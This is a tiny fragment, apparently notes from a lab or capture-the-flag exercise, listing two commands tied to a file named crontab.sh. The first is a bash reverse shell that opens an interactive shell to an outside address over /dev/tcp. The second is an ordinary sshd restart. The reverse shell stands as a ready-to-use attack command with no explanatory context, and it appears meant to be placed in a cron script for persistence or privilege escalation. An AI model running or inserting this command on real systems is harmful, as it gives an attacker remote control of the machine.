./crontab.sh
command
bash -i >& /dev/tcp/10.10.140.151/445 0>&1

./crontab.sh
command
systemctl restart sshd